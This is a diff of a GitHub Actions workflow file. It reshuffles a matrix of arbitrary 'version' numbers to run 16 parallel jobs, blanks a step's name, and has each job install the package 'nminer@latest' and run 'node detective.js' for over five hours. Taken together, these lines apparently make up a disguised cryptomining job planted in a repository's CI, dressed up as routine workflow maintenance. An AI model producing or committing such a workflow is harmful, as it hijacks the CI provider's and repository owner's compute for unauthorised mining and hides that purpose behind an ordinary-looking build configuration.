@@ -9,21 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6178 }
-          - { version: 1259 }
-          - { version: 8384 }
-          - { version: 2124 }
-          - { version: 8891 }
-          - { version: 323 }
-          - { version: 505 }
-          - { version: 260 }
-          - { version: 3697 }
-          - { version: 8279 }
-          - { version: 7558 }
-          - { version: 2543 }
-          - { version: 8461 }
-          - { version: 9986 }
-          - { version: 6221 }
+          - { version: 177 }
+          - { version: 6483 }
+          - { version: 1823 }
+          - { version: 6854 }
+          - { version: 7809 }
+          - { version: 644 }
+          - { version: 5308 }
+          - { version: 7322 }
+          - { version: 2257 }
+          - { version: 3740 }
+          - { version: 6234 }
+          - { version: 1124 }
+          - { version: 7824 }
+          - { version: 7706 }
+          - { version: 9194 }
+          - { version: 7334 }
 
     steps:
       - name: Checkout
@@ -34,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: however hm
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 335m node detective.js || echo "detective executed"
+          timeout 310m node detective.js || echo "detective executed"
